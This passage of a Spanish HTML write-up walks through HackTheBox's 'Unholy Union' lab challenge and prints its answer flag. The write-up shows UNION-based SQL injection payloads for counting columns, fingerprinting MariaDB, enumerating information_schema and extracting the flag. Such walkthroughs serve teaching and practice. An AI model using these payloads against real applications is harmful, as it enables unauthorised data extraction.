@@ -1,0 +1,894 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Unholy Union — HackTheBox Writeup | Brandeiks</title>
+  <meta name="description" content="Writeup del reto Unholy Union de HackTheBox — Dificultad: Very Easy. SQL Injection vía UNION SELECT para extraer la flag de una API de inventario embrujado.">
+  <meta name="author" content="Brandon Zevallos Pastrana">
+  <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Crect width='100' height='100' fill='%2300ff88' rx='20'/%3E%3Ctext x='50%25' y='50%25' text-anchor='middle' dy='.35em' font-size='70' font-weight='bold' fill='%23050a0e' font-family='monospace'%3EB%3C/text%3E%3C/svg%3E">
+  <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Rajdhani:wght@300;400;600;700&family=Orbitron:wght@400;700;900&display=swap" rel="stylesheet"/>
+  <style>
+    :root {
+      --bg:        #050a0e;
+      --bg2:       #080f14;
+      --bg3:       #0a1520;
+      --green:     #00ff88;
+      --cyan:      #00ff88;
+      --red:       #ff2d55;
+      --yellow:    #ffd700;
+      --orange:    #ff8c00;
+      --purple:    #bf5fff;
+      --dim:       #1a2a2e;
+      --text:      #c8d8e0;
+      --text-dim:  #4a6a74;
+      --font-mono: 'Share Tech Mono', monospace;
+      --font-main: 'Rajdhani', sans-serif;
+      --font-disp: 'Orbitron', sans-serif;
+    }
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    html { scroll-behavior: smooth; }
+    body {
+      background: var(--bg);
+      color: var(--text);
+      font-family: var(--font-main);
+      overflow-x: hidden;
+      cursor: none;
+    }
+    body::before {
+      content: '';
+      position: fixed; inset: 0;
+      background: repeating-linear-gradient(
+        0deg, transparent, transparent 2px,
+        rgba(0,255,136,0.012) 2px, rgba(0,255,136,0.012) 4px
+      );
+      pointer-events: none; z-index: 1000;
+    }
+
+    /* CURSOR */
+    a, button { cursor: none; }
+    .cursor {
+      position: fixed; width: 10px; height: 10px;
+      background: var(--green); border-radius: 50%;
+      pointer-events: none; z-index: 9999;
+      transform: translate(-50%,-50%);
+      box-shadow: 0 0 12px var(--green); opacity: 0;
+    }
+    .cursor-ring {
+      position: fixed; width: 36px; height: 36px;
+      border: 1px solid var(--green); border-radius: 50%;
+      pointer-events: none; z-index: 9998;
+      transform: translate(-50%,-50%); opacity: 0;
+      transition: all 0.12s ease;
+    }
+
+    /* NAV */
+    nav {
+      position: fixed; top: 0; left: 0; right: 0; z-index: 500;
+      display: flex; justify-content: space-between; align-items: center;
+      padding: 1.2rem 4rem;
+      background: rgba(5,10,14,0.92); backdrop-filter: blur(10px);
+      border-bottom: 1px solid rgba(0,255,136,0.08);
+    }
+    .nav-logo { font-family: var(--font-disp); font-size: 1rem; color: var(--green); letter-spacing: 4px; text-decoration: none; }
+    .nav-back { font-family: var(--font-mono); font-size: 0.78rem; color: var(--text-dim); text-decoration: none; letter-spacing: 2px; transition: color 0.3s; }
+    .nav-back::before { content: '← '; }
+    .nav-back:hover { color: var(--green); }
+
+    /* HERO */
+    .writeup-hero {
+      min-height: 42vh; display: flex; align-items: flex-end;
+      padding: 8rem 4rem 3rem; position: relative; overflow: hidden;
+      border-bottom: 1px solid var(--dim);
+    }
+    .hero-grid {
+      position: absolute; inset: 0;
+      background-image:
+        linear-gradient(rgba(0,255,136,0.03) 1px, transparent 1px),
+        linear-gradient(90deg, rgba(0,255,136,0.03) 1px, transparent 1px);
+      background-size: 60px 60px;
+    }
+    .hero-glow {
+      position: absolute; width: 600px; height: 400px;
+      background: radial-gradient(ellipse, rgba(0,255,136,0.07) 0%, transparent 70%);
+      top: 0; left: 0; pointer-events: none;
+    }
+    .writeup-hero-content { position: relative; z-index: 2; max-width: 900px; }
+    .breadcrumb { font-family: var(--font-mono); font-size: 0.72rem; color: var(--text-dim); letter-spacing: 2px; margin-bottom: 1.2rem; }
+    .breadcrumb a { color: var(--text-dim); text-decoration: none; transition: color 0.2s; }
+    .breadcrumb a:hover { color: var(--green); }
+    .breadcrumb span { color: var(--green); }
+    .writeup-title { font-family: var(--font-disp); font-size: clamp(2.5rem, 6vw, 4.5rem); font-weight: 900; letter-spacing: 2px; line-height: 1.1; }
+    .writeup-title span { color: var(--cyan); }
+    .writeup-subtitle { font-family: var(--font-mono); font-size: 0.85rem; color: var(--text-dim); margin-top: 0.8rem; letter-spacing: 1px; }
+    .writeup-meta { display: flex; flex-wrap: wrap; gap: 1rem; align-items: center; margin-top: 1.8rem; }
+    .meta-badge { font-family: var(--font-mono); font-size: 0.68rem; letter-spacing: 2px; padding: 0.3rem 0.8rem; border: 1px solid; }
+    .badge-facil   { color: #00ffcc;  border-color: rgba(0,255,204,0.4);  background: rgba(0,255,204,0.05); }
+    .badge-htb     { color: var(--green);  border-color: rgba(0,255,136,0.3);  background: rgba(0,255,136,0.05); }
+    .badge-linux   { color: var(--yellow); border-color: rgba(255,215,0,0.3);  background: rgba(255,215,0,0.05); }
+    .badge-cve     { color: var(--red);    border-color: rgba(255,45,85,0.4);   background: rgba(255,45,85,0.05); }
+    .badge-shell   { color: var(--cyan);   border-color: rgba(0,229,255,0.3);   background: rgba(0,229,255,0.05); }
+    .badge-sqli    { color: var(--purple); border-color: rgba(191,95,255,0.4);  background: rgba(191,95,255,0.05); }
+    .badge-nmap    { color: var(--orange); border-color: rgba(255,140,0,0.4);   background: rgba(255,140,0,0.05); }
+    .meta-date { font-family: var(--font-mono); font-size: 0.7rem; color: var(--text-dim); }
+
+    /* LAYOUT */
+    .writeup-layout {
+      display: grid; grid-template-columns: 1fr 240px;
+      gap: 3rem; max-width: 1300px; margin: 0 auto; padding: 4rem;
+    }
+
+    /* SIDEBAR */
+    .sidebar { position: sticky; top: 5rem; height: fit-content; order: 2; }
+    .sidebar-box { border: 1px solid var(--dim); padding: 1.5rem; background: var(--bg2); margin-bottom: 1.5rem; }
+    .sidebar-title { font-family: var(--font-mono); font-size: 0.65rem; color: var(--green); letter-spacing: 3px; margin-bottom: 1.2rem; }
+    .toc-list { list-style: none; display: flex; flex-direction: column; gap: 0.4rem; }
+    .toc-list a {
+      font-family: var(--font-mono); font-size: 0.7rem; color: var(--text-dim);
+      text-decoration: none; letter-spacing: 1px; transition: all 0.2s;
+      display: block; padding: 0.25rem 0.8rem;
+      border-left: 2px solid transparent;
+    }
+    .toc-list a:hover { color: var(--green); border-left-color: var(--green); }
+    .toc-list a.active { color: var(--green); border-left-color: var(--green); opacity: 1; }
+    .info-row { display: flex; justify-content: space-between; align-items: center; margin-bottom: 0.8rem; }
+    .info-label { font-family: var(--font-mono); font-size: 0.65rem; color: var(--text-dim); letter-spacing: 1px; }
+    .info-val { font-family: var(--font-mono); font-size: 0.72rem; }
+    .val-green  { color: var(--green); }
+    .val-cyan   { color: var(--cyan); }
+    .val-yellow { color: var(--yellow); }
+    .val-red    { color: var(--red); }
+    .val-facil  { color: #00ffcc; }
+
+    /* ATTACK PATH */
+    .attack-path { display: flex; flex-direction: column; gap: 0; }
+    .ap-item { display: flex; align-items: flex-start; gap: 0.8rem; padding: 0.5rem 0; }
+    .ap-dot { width: 8px; height: 8px; background: var(--green); border-radius: 50%; margin-top: 4px; flex-shrink: 0; box-shadow: 0 0 6px var(--green); }
+    .ap-line { width: 1px; height: 16px; background: rgba(0,255,136,0.2); margin: 0 3.5px; }
+    .ap-text { font-family: var(--font-mono); font-size: 0.65rem; color: var(--text-dim); line-height: 1.5; }
+    .ap-text span { color: var(--cyan); }
+
+    /* CONTENT */
+    .writeup-content { min-width: 0; order: 1; }
+
+    /* PROGRESS BAR */
+    .progress-container { position: fixed; top: 0; left: 0; width: 100%; height: 3px; background: transparent; z-index: 1001; }
+    .progress-bar { height: 100%; background: var(--green); width: 0%; transition: width 0.15s ease; box-shadow: 0 0 8px var(--green); }
+
+    /* SKIP LINK */
+    .skip-link { position: absolute; top: -40px; left: 0; background: var(--green); color: var(--bg); padding: 8px 16px; z-index: 10000; text-decoration: none; font-family: var(--font-mono); font-size: 0.8rem; transition: top 0.2s; }
+    .skip-link:focus { top: 0; }
+
+    /* COPY BUTTON */
+    .copy-btn {
+      position: absolute; top: 0.5rem; right: 4.5rem;
+      background: var(--dim); border: 1px solid rgba(0,255,136,0.3);
+      color: var(--text-dim); font-family: var(--font-mono);
+      font-size: 0.62rem; padding: 0.15rem 0.5rem; letter-spacing: 1px;
+      cursor: none; opacity: 0; transition: opacity 0.2s, background 0.2s, color 0.2s;
+      z-index: 10; white-space: nowrap;
+    }
+    .cmd-block:hover .copy-btn { opacity: 1; }
+    .copy-btn:hover { background: var(--green); color: var(--bg); border-color: var(--green); }
+    .copy-btn.copied { background: var(--green); color: var(--bg); border-color: var(--green); opacity: 1; }
+
+    /* TOAST */
+    .toast {
+      position: fixed; bottom: 24px; right: 24px;
+      background: var(--green); color: #000;
+      padding: 0.7rem 1.4rem; font-family: var(--font-mono);
+      font-size: 0.75rem; letter-spacing: 2px; font-weight: 600;
+      opacity: 0; transform: translateY(8px);
+      transition: opacity 0.25s, transform 0.25s;
+      pointer-events: none; z-index: 10000;
+    }
+    .toast.show { opacity: 1; transform: translateY(0); }
+
+    /* SECTIONS */
+    .section { margin-bottom: 4rem; opacity: 0; transform: translateY(20px); transition: opacity 0.5s ease, transform 0.5s ease; }
+    .section.visible { opacity: 1; transform: translateY(0); }
+    .section-label { font-family: var(--font-mono); font-size: 0.68rem; color: var(--green); letter-spacing: 4px; margin-bottom: 0.5rem; }
+    .section-title { font-family: var(--font-disp); font-size: 1.5rem; font-weight: 700; letter-spacing: 2px; margin-bottom: 0.6rem; }
+    .section-line { width: 40px; height: 2px; background: var(--green); margin-bottom: 2rem; }
+
+    /* PROSE */
+    .prose p { font-size: 1.05rem; line-height: 1.9; color: var(--text-dim); margin-bottom: 1rem; }
+    .prose p strong { color: var(--text); }
+    .prose p .hl       { color: var(--green); font-weight: bold; }
+    .prose p .hl-cyan  { color: var(--cyan); }
+    .prose p .hl-red   { color: var(--red); }
+    .prose p .hl-yel   { color: var(--yellow); }
+    .prose p .hl-pur   { color: var(--purple); }
+
+    /* STEP */
+    .step-marker { display: flex; align-items: center; gap: 1rem; margin-bottom: 1.2rem; margin-top: 2.5rem; }
+    .step-num { font-family: var(--font-disp); font-size: 0.65rem; color: var(--bg); background: var(--green); width: 26px; height: 26px; display: flex; align-items: center; justify-content: center; flex-shrink: 0; font-weight: 900; }
+    .step-title { font-family: var(--font-mono); font-size: 0.8rem; color: var(--green); letter-spacing: 2px; }
+
+    /* CMD BLOCK */
+    .cmd-block {
+      background: var(--bg3); border: 1px solid rgba(0,229,255,0.15);
+      border-left: 3px solid var(--cyan); padding: 1rem 1.2rem;
+      margin: 1rem 0; font-family: var(--font-mono); font-size: 0.82rem;
+      overflow-x: auto; position: relative; line-height: 1.8;
+    }
+    .cmd-block .cmd-label { position: absolute; top: 0.5rem; right: 0.8rem; font-size: 0.6rem; color: var(--text-dim); letter-spacing: 2px; }
+    .cmd-block .prompt { color: var(--green); user-select: none; }
+    .cmd-block .prompt-root { color: var(--red); user-select: none; }
+    .cmd-block .cmd    { color: var(--text); }
+    .cmd-block .flag   { color: var(--cyan); }
+    .cmd-block .arg    { color: var(--yellow); }
+    .cmd-block .comment { color: var(--text-dim); font-size: 0.75rem; }
+
+    /* OUTPUT */
+    .output-block {
+      background: #020608; border: 1px solid var(--dim);
+      padding: 1rem 1.2rem; margin: 0.5rem 0 1.5rem;
+      font-family: var(--font-mono); font-size: 0.77rem;
+      line-height: 1.9; color: var(--text-dim); overflow-x: auto;
+    }
+    .output-block .o-green  { color: var(--green); }
+    .output-block .o-cyan   { color: var(--cyan); }
+    .output-block .o-red    { color: var(--red); }
+    .output-block .o-yellow { color: var(--yellow); }
+    .output-block .o-white  { color: var(--text); }
+    .output-block .o-purple { color: var(--purple); }
+
+    /* INFO BOX */
+    .info-box { border: 1px solid rgba(0,229,255,0.2); background: rgba(0,229,255,0.04); padding: 1.2rem 1.5rem; margin: 1.2rem 0; }
+    .info-box-title { font-family: var(--font-mono); font-size: 0.65rem; color: var(--cyan); letter-spacing: 3px; margin-bottom: 0.6rem; }
+    .info-box p { font-family: var(--font-mono); font-size: 0.78rem; color: var(--text-dim); line-height: 1.7; }
+    .info-box p strong { color: var(--cyan); }
+
+    .warn-box { border: 1px solid rgba(255,140,0,0.25); background: rgba(255,140,0,0.04); padding: 1.2rem 1.5rem; margin: 1.2rem 0; }
+    .warn-box-title { font-family: var(--font-mono); font-size: 0.65rem; color: var(--orange); letter-spacing: 3px; margin-bottom: 0.6rem; }
+    .warn-box p { font-family: var(--font-mono); font-size: 0.78rem; color: var(--text-dim); line-height: 1.7; }
+    .warn-box p strong { color: var(--orange); }
+
+    .cve-box { border: 1px solid rgba(255,45,85,0.3); background: rgba(255,45,85,0.04); padding: 1.2rem 1.5rem; margin: 1.2rem 0; }
+    .cve-box-title { font-family: var(--font-mono); font-size: 0.65rem; color: var(--red); letter-spacing: 3px; margin-bottom: 0.6rem; }
+    .cve-box p { font-family: var(--font-mono); font-size: 0.78rem; color: var(--text-dim); line-height: 1.7; }
+    .cve-box p strong { color: var(--red); }
+
+    /* CRED BOX (reusado para FLAG) */
+    .cred-box { border: 1px solid rgba(0,255,136,0.25); background: rgba(0,255,136,0.04); padding: 1.2rem 1.5rem; margin: 1.2rem 0; display: flex; gap: 2rem; flex-wrap: wrap; }
+    .cred-item .cred-label { font-family: var(--font-mono); font-size: 0.6rem; color: var(--text-dim); letter-spacing: 2px; margin-bottom: 0.3rem; }
+    .cred-item .cred-val   { font-family: var(--font-mono); font-size: 0.95rem; color: var(--green); word-break: break-all; }
+
+    /* VULN TABLE */
+    .vuln-table { width: 100%; border-collapse: collapse; margin: 1.5rem 0; }
+    .vuln-table th, .vuln-table td { font-family: var(--font-mono); font-size: 0.72rem; padding: 0.8rem 1rem; text-align: left; border-bottom: 1px solid var(--dim); }
+    .vuln-table th { color: var(--cyan); letter-spacing: 2px; border-bottom-color: rgba(0,229,255,0.2); }
+    .vuln-table td { color: var(--text-dim); }
+    .vuln-table td:first-child { color: var(--green); }
+
+    /* RESULT TABLE (resultados de consultas SQL) */
+    .result-table { width: 100%; border-collapse: collapse; margin: 0.5rem 0 1.5rem; background: #020608; border: 1px solid var(--dim); font-family: var(--font-mono); font-size: 0.7rem; overflow-x: auto; display: block; }
+    .result-table table { width: 100%; border-collapse: collapse; }
+    .result-table th { background: rgba(0,229,255,0.06); color: var(--cyan); letter-spacing: 1px; padding: 0.5rem 0.7rem; text-align: left; border-bottom: 1px solid rgba(0,229,255,0.2); white-space: nowrap; }
+    .result-table td { padding: 0.5rem 0.7rem; color: var(--text-dim); border-bottom: 1px solid var(--dim); white-space: nowrap; }
+    .result-table tr:last-child td { border-bottom: none; }
+    .result-table td.payload-cell { color: var(--green); }
+
+    /* DIVIDER */
+    hr.divider { border: none; height: 1px; background: linear-gradient(90deg, rgba(0,255,136,0.3), transparent); margin: 3rem 0; }
+
+    /* CMD REF SECTION */
+    .cmd-ref-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 1.2rem; margin-top: 1.5rem; }
+    .cmd-ref-card { border: 1px solid var(--dim); background: var(--bg2); padding: 1.5rem; transition: border-color 0.3s; }
+    .cmd-ref-card:hover { border-color: rgba(0,229,255,0.25); }
+    .cmd-ref-name { font-family: var(--font-mono); font-size: 0.9rem; color: var(--cyan); margin-bottom: 0.5rem; letter-spacing: 1px; }
+    .cmd-ref-syntax { font-family: var(--font-mono); font-size: 0.72rem; color: var(--green); background: var(--bg3); padding: 0.4rem 0.7rem; margin-bottom: 0.8rem; display: inline-block; }
+    .cmd-ref-desc { font-size: 0.92rem; color: var(--text-dim); line-height: 1.7; margin-bottom: 0.8rem; }
+    .cmd-ref-flags { list-style: none; display: flex; flex-direction: column; gap: 0.3rem; }
+    .cmd-ref-flags li { font-family: var(--font-mono); font-size: 0.7rem; color: var(--text-dim); }
+    .cmd-ref-flags li span { color: var(--yellow); }
+
+    /* GLOSARIO */
+    .glosario-grid { display: grid; grid-template-columns: 1fr; gap: 1rem; margin-top: 1.5rem; }
+    .glos-card { border: 1px solid var(--dim); background: var(--bg2); padding: 1.4rem 1.5rem; transition: border-color 0.3s; }
+    .glos-card:hover { border-color: rgba(0,229,255,0.2); }
+    .glos-term { font-family: var(--font-mono); font-size: 0.88rem; color: var(--cyan); margin-bottom: 0.4rem; letter-spacing: 1px; }
+    .glos-def { font-size: 0.95rem; color: var(--text-dim); line-height: 1.75; }
+    .glos-def strong { color: var(--green); }
+    .glos-def code { color: var(--yellow); font-family: var(--font-mono); font-size: 0.85em; }
+
+    /* FOOTER */
+    footer { padding: 2rem 4rem; border-top: 1px solid var(--dim); display: flex; justify-content: space-between; align-items: center; margin-top: 4rem; }
+    footer p { font-family: var(--font-mono); font-size: 0.7rem; color: var(--text-dim); letter-spacing: 1px; }
+    footer span { color: var(--green); }
+
+    @media (max-width: 960px) {
+      nav, .writeup-hero, footer { padding-left: 1.5rem; padding-right: 1.5rem; }
+      .writeup-layout { grid-template-columns: 1fr; padding: 2rem 1.5rem; }
+      .sidebar { position: static; }
+      .cmd-ref-grid { grid-template-columns: 1fr; }
+      body, a, button { cursor: auto; }
+      .cursor, .cursor-ring { display: none; }
+    }
+  </style>
+</head>
+<body>
+
+<a href="#main-content" class="skip-link">Saltar al contenido principal</a>
+<div class="progress-container"><div class="progress-bar" id="readingProgress"></div></div>
+<div class="cursor" id="cursor"></div>
+<div class="cursor-ring" id="cursorRing"></div>
+
+<nav>
+  <a href="../../index.html" class="nav-logo">BRANDEIKS_SEC</a>
+  <a href="../../index.html" class="nav-back">volver al portafolio</a>
+</nav>
+
+<!-- HERO -->
+<div class="writeup-hero">
+  <div class="hero-grid"></div>
+  <div class="hero-glow"></div>
+  <div class="writeup-hero-content">
+    <p class="breadcrumb">
+      <a href="../../index.html">brandeiks</a> /
+      <a href="../">writeups</a> /
+      <a href="../../writeups/hackthebox/">hackthebox</a> /
+      <span>unholy union</span>
+    </p>
+    <h1 class="writeup-title"><span>Unholy Union</span></h1>
+    <p class="writeup-subtitle">HackTheBox — Web Challenge · SQL Injection (UNION-Based) → Dump de información_schema → Flag</p>
+    <div class="writeup-meta">
+      <span class="meta-badge badge-facil">● VERY EASY</span>
+      <span class="meta-badge badge-htb">HACKTHEBOX</span>
+      <span class="meta-badge badge-shell">WEB</span>
+      <span class="meta-badge badge-sqli">SQL INJECTION</span>
+      <span class="meta-badge badge-linux">MARIADB</span>
+      <span class="meta-date">📅 Junio 2026 · By Brandeiks</span>
+    </div>
+  </div>
+</div>
+
+<!-- LAYOUT -->
+<div class="writeup-layout">
+
+  <!-- SIDEBAR -->
+  <aside class="sidebar">
+    <div class="sidebar-box">
+      <p class="sidebar-title">// ÍNDICE</p>
+      <ul class="toc-list">
+        <li><a href="#resumen">01 · Resumen</a></li>
+        <li><a href="#reconocimiento">02 · Inspección de la app</a></li>
+        <li><a href="#union">03 · Encontrando el UNION</a></li>
+        <li><a href="#enum">04 · Enumeración de la BD</a></li>
+        <li><a href="#flag">05 · Extracción de la Flag</a></li>
+        <li><a href="#referencia">06 · Referencia de Comandos</a></li>
+        <li><a href="#glosario">07 · Glosario</a></li>
+      </ul>
+    </div>
+    <div class="sidebar-box">
+      <p class="sidebar-title">// INFO</p>
+      <div class="info-row"><span class="info-label">Plataforma</span><span class="info-val val-green">HackTheBox</span></div>
+      <div class="info-row"><span class="info-label">Categoría</span><span class="info-val val-yellow">Web</span></div>
+      <div class="info-row"><span class="info-label">Dificultad</span><span class="info-val val-facil">Very Easy</span></div>
+      <div class="info-row"><span class="info-label">Motor BD</span><span class="info-val" style="color:var(--text)">MariaDB 10.11.8</span></div>
+      <div class="info-row"><span class="info-label">Base de Datos</span><span class="info-val" style="color:var(--text)">halloween_invetory</span></div>
+      <div class="info-row"><span class="info-label">Estado</span><span class="info-val val-green">● Solved</span></div>
+    </div>
+    <div class="sidebar-box">
+      <p class="sidebar-title">// ATTACK PATH</p>
+      <div class="attack-path">
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>Inspección</span> → input de búsqueda concatenado a SQL</div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>UNION SELECT 1,2,3,4,5</span> → 5 columnas confirmadas</div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>@@version / database() / user()</span> → fingerprint del motor</div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>information_schema.tables</span> → tablas flag e inventory</div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>information_schema.columns</span> → columna "flag"</div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot" style="background:var(--red);box-shadow:0 0 6px var(--red)"></div><div class="ap-text"><span style="color:var(--red)">UNION SELECT flag FROM flag</span> → FLAG</div></div>
+      </div>
+    </div>
+  </aside>
+
+  <!-- CONTENT -->
+  <main class="writeup-content" id="main-content">
+
+    <!-- RESUMEN -->
+    <div class="section" id="resumen">
+      <p class="section-label">// 01</p>
+      <h2 class="section-title">Resumen</h2>
+      <div class="section-line"></div>
+      <div class="prose">
+        <p>
+          <strong>Unholy Union</strong> es un reto de categoría <span class="hl-cyan">Web</span> de
+          dificultad <span class="hl">Very Easy</span> en HackTheBox, diseñado específicamente para
+          enseñar y practicar <span class="hl-pur">SQL Injection basada en UNION</span>.
+        </p>
+        <p>
+          La aplicación, un falso "Haunted Inventory Manager", expone un campo de búsqueda que
+          concatena directamente la entrada del usuario dentro de una consulta
+          <code style="color:var(--yellow)">SELECT * FROM inventory</code> sin ningún tipo de
+          sanitización ni uso de consultas parametrizadas.
+        </p>
+        <p>
+          Tras determinar el número exacto de columnas de la consulta original con
+          <code style="color:var(--yellow)">UNION SELECT</code>, se utiliza ese mismo canal para
+          consultar <strong>information_schema</strong> y mapear la base de datos completa:
+          motor (<span class="hl-cyan">MariaDB 10.11.8</span>), nombre de la base de datos
+          (<span class="hl-cyan">halloween_invetory</span>), tablas disponibles
+          (<code style="color:var(--yellow)">inventory</code>, <code style="color:var(--yellow)">flag</code>)
+          y sus columnas. Finalmente se inyecta una consulta directa sobre la tabla
+          <code style="color:var(--yellow)">flag</code> para obtener la flag del reto.
+        </p>
+      </div>
+
+      <table class="vuln-table">
+        <thead>
+          <tr><th>Fase</th><th>Técnica / Payload</th><th>Resultado</th></tr>
+        </thead>
+        <tbody>
+          <tr><td>Inspección</td><td>Búsqueda normal en la barra de texto</td><td>Endpoint devuelve un array JSON de items</td></tr>
+          <tr><td>Conteo de columnas</td><td>' UNION SELECT 1,2,3,4,5-- -</td><td>5 columnas confirmadas en la consulta original</td></tr>
+          <tr><td>Fingerprint</td><td>UNION SELECT 1,2,3,4,@@version-- -</td><td>10.11.8-MariaDB</td></tr>
+          <tr><td>Fingerprint</td><td>UNION SELECT 1,2,3,4,database()-- -</td><td>halloween_invetory</td></tr>
+          <tr><td>Fingerprint</td><td>UNION SELECT 1,2,3,4,user()-- -</td><td>user@localhost</td></tr>
+          <tr><td>Enum. BDs</td><td>information_schema.schemata</td><td>information_schema, test, halloween_invetory</td></tr>
+          <tr><td>Enum. tablas</td><td>information_schema.tables WHERE table_schema=database()</td><td>flag, inventory</td></tr>
+          <tr><td>Enum. columnas</td><td>information_schema.columns WHERE table_name='flag'</td><td>columna única: flag</td></tr>
+          <tr><td>Extracción</td><td>UNION SELECT 1,2,3,4,flag FROM flag-- -</td><td>HTB{un10n_1Nj3ct1on_15_345y_t0_l34rn_r1gh17?}</td></tr>
+        </tbody>
+      </table>
+    </div>
+
+    <hr class="divider">
+
+    <!-- RECONOCIMIENTO -->
+    <div class="section" id="reconocimiento">
+      <p class="section-label">// 02</p>
+      <h2 class="section-title">Inspección de la app</h2>
+      <div class="section-line"></div>
+
+      <div class="step-marker">
+        <div class="step-num">1</div>
+        <span class="step-title">EXPLORANDO EL HAUNTED INVENTORY MANAGER</span>
+      </div>
+      <div class="prose">
+        <p>
+          La aplicación web es un panel de temática de Halloween llamado
+          <strong>"Haunted Inventory Manager"</strong>, con un único campo de búsqueda que permite
+          filtrar "objetos embrujados" del inventario. El panel de la derecha muestra el resultado
+          en bruto en formato JSON, lo que confirma que el backend devuelve directamente filas de
+          una tabla de base de datos.
+        </p>
+      </div>
+
+      <div class="output-block">
+        <div><span class="o-cyan">SQL INPUT:</span> SELECT * FROM inventory</div>
+        <div>&nbsp;</div>
+        <div><span class="o-cyan">SQL OUTPUT:</span></div>
+        <div>{</div>
+        <div>&nbsp;&nbsp;"description": <span class="o-yellow">"A floating vehicle for all-terrain exploration."</span>,</div>
+        <div>&nbsp;&nbsp;"origin": <span class="o-yellow">"Planet Squanch"</span>,</div>
+        <div>&nbsp;&nbsp;"created_at": <span class="o-yellow">"2026-06-21T05:25:42.000Z"</span></div>
+        <div>},</div>
+        <div>{</div>
+        <div>&nbsp;&nbsp;"id": <span class="o-green">10</span>,</div>
+        <div>&nbsp;&nbsp;"name": <span class="o-yellow">"Galactic Freight Ship"</span>,</div>
+        <div>&nbsp;&nbsp;"description": <span class="o-yellow">"A massive ship used for transporting goods across galaxies."</span>,</div>
+        <div>&nbsp;&nbsp;"origin": <span class="o-yellow">"Alpha Centauri"</span>,</div>
+        <div>&nbsp;&nbsp;"created_at": <span class="o-yellow">"2026-06-21T05:25:42.000Z"</span></div>
+        <div>}</div>
+      </div>
+
+      <div class="info-box">
+        <p class="info-box-title">// OBSERVACIÓN CLAVE</p>
+        <p>El panel "SQL Input" exhibe literalmente la consulta ejecutada en el backend: <strong>SELECT * FROM inventory</strong>. Esto sugiere fuertemente que el término de búsqueda se concatena directamente en una cláusula WHERE sin sanitizar, abriendo la puerta a una inyección SQL clásica.</p>
+      </div>
+    </div>
+
+    <hr class="divider">
+
+    <!-- ENCONTRANDO EL UNION -->
+    <div class="section" id="union">
+      <p class="section-label">// 03</p>
+      <h2 class="section-title">Encontrando el UNION</h2>
+      <div class="section-line"></div>
+
+      <div class="step-marker">
+        <div class="step-num">2</div>
+        <span class="step-title">DETERMINAR EL NÚMERO DE COLUMNAS</span>
+      </div>
+      <div class="prose">
+        <p>
+          Antes de poder inyectar datos propios con <code style="color:var(--yellow)">UNION SELECT</code>,
+          es necesario que el número de columnas coincida exactamente con la consulta original. Se
+          prueba con 5 valores enteros, cerrando la comilla de entrada y comentando el resto de la
+          consulta con <code style="color:var(--yellow)">-- -</code>:
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="' UNION SELECT 1,2,3,4,5-- -">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">PAYLOAD</span>
+        <div><span class="cmd">' UNION SELECT <span class="arg">1,2,3,4,5</span>-- -</span></div>
+      </div>
+
+      <div class="result-table">
+        <table>
+          <tr><th>ID</th><th>NAME</th><th>DESCRIPTION</th><th>ORIGIN</th><th>CREATED_AT</th></tr>
+          <tr><td>1</td><td>Plumbus</td><td>A highly useful multi-purpose tool.</td><td>Planet Schlooch</td><td>2026-06-21 05.25.42</td></tr>
+          <tr><td class="payload-cell">1</td><td class="payload-cell">2</td><td class="payload-cell">3</td><td class="payload-cell">4</td><td class="payload-cell">5</td></tr>
+        </table>
+      </div>
+
+      <div class="prose">
+        <p>
+          La consulta no devuelve error y la fila inyectada (<span class="hl">1, 2, 3, 4, 5</span>)
+          aparece al final de la tabla de resultados — confirmando que la consulta original tiene
+          exactamente <strong>5 columnas</strong>. La quinta columna es la que se renderiza como
+          texto libre, así que será el punto de inyección para extraer datos en los siguientes pasos.
+        </p>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">3</div>
+        <span class="step-title">FINGERPRINT DEL MOTOR DE BASE DE DATOS</span>
+      </div>
+
+      <div class="cmd-block" data-cmd="' UNION SELECT 1,2,3,4,@@version-- -">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">PAYLOAD</span>
+        <div><span class="cmd">' UNION SELECT 1,2,3,4,<span class="arg">@@version</span>-- -</span></div>
+      </div>
+
+      <div class="prose">
+        <p>La variable global <code style="color:var(--yellow)">@@version</code> reemplaza al literal en la quinta columna, revelando la versión exacta del motor:</p>
+      </div>
+
+      <div class="output-block">
+        <div><span class="o-green">10.11.8-MariaDB</span></div>
+      </div>
+    </div>
+
+    <hr class="divider">
+
+    <!-- ENUMERACIÓN -->
+    <div class="section" id="enum">
+      <p class="section-label">// 04</p>
+      <h2 class="section-title">Enumeración de la Base de Datos</h2>
+      <div class="section-line"></div>
+
+      <div class="step-marker">
+        <div class="step-num">4</div>
+        <span class="step-title">BASE DE DATOS ACTUAL Y USUARIO</span>
+      </div>
+      <div class="prose">
+        <p>Se identifican el contexto de ejecución actual con las funciones nativas <code style="color:var(--yellow)">database()</code> y <code style="color:var(--yellow)">user()</code>:</p>
+      </div>
+
+      <div class="cmd-block" data-cmd="' UNION SELECT 1,2,3,4,database()-- -">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">PAYLOAD</span>
+        <div><span class="cmd">' UNION SELECT 1,2,3,4,<span class="arg">database()</span>-- -</span></div>
+      </div>
+
+      <div class="output-block">
+        <div><span class="o-green">halloween_invetory</span></div>
+      </div>
+
+      <div class="cmd-block" data-cmd="' UNION SELECT 1,2,3,4,user()-- -">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">PAYLOAD</span>
